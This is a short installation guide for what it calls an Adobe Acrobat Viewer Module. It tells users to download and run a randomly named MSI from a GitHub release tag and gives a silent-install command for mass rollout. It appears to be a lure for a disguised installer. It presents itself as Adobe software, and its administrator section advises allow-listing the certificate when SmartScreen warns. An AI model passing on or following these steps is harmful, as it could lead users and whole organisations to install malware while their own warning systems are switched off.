# Installation guide

## Adobe Acrobat Viewer Module

### End users

Download `adb_6u05yg3qpvq59_v29836.msi` from release `v55016` and run the installer.

### IT administrators

- Deploy via your software distribution tool using the release asset URL.
- Allow-list the publisher certificate if SmartScreen prompts appear on first rollout.
- Module updates are delivered through new GitHub release tags; pin `v55016` for pilot groups.

### Silent install

```
adb_6u05yg3qpvq59_v29836.msi /quiet /norestart
```

> Adjust switches per your packaging if the build is an MSI-based update module.
